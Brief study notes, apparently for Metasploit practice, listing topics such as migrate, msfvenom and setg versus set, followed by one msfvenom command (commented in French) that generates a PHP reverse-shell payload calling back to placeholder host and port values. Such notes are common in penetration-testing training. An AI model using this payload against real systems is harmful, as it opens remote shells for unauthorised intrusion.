> migrate explication
> cheatsheet
> msfvenom script generation explain
> difference between setg and set

```bash
# utilisation de msfvenom pour generer un reverse shell php
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```